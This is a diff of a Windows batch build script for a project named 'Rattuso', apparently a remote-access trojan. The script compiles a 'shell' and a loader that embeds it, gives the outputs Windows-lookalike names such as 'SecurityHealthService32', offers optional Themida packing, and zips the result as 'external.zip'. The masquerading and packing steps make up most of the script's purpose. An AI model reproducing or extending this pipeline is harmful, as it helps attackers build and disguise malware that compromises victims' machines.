@@ -23,14 +23,6 @@ echo UseThemida: %UseThemida%
 echo ThemidaPath: %ThemidaPath%
 echo LegitProgramPath: %LegitProgramPath%
 
-:: Display current global vars
-echo Current global variables:
-echo MSBuildPath: %MSBuildPath%
-echo ShellBuildPath: %ShellBuildPath%
-echo DllBuildPath: %DllBuildPath%
-echo NoDll: %NoDll%
-echo LegitProgramPath: %LegitProgramPath%
-
 :: This command builds the shell in release mode
 %MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthService32 /p:Platform="x64"
 
@@ -46,12 +38,8 @@ if %NoDll%==1 (
 	echo Dll will be used to build the main loader
 	%cd%\objectify\objectify.py %ShellBuildPath%
 )
-%cd%\objectify\objectify_net.py -p -n ShellManagerService -c ShellManager %ShellBuildPath%
 
 :: Move the embed files in the appropriate directories
-echo Building service...
-MOVE /Y embeds.cs %cd%\ShellManagerService\embeds.cs
-%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:SecurityHealthServiceManager /p:Platform="x86"
 if %NoDll%==1 (
 	echo Building main loader without DLL
 	MOVE /Y embeds.h %cd%\MainLoader\embeds.h
@@ -66,4 +54,9 @@ if %NoDll%==1 (
 	%MSBuildPath% Rattuso.sln /property:Configuration=Release /t:MainLoader /p:Platform=%Platform%
 )
 
+echo Creating external.zip
+cd "%cd%\output\x64\Release"
+ren %ShellBuildPath% SecurityHealthServiceManager.exe
+tar.exe -a -cf external.zip SecurityHealthServiceManager.exe
+if %UseThemida%==0 (ren SecurityHealthServiceManager.exe SecurityHealthService32.exe) else (ren SecurityHealthServiceManager.exe SecurityHealthService32_protected.exe)
 PAUSE
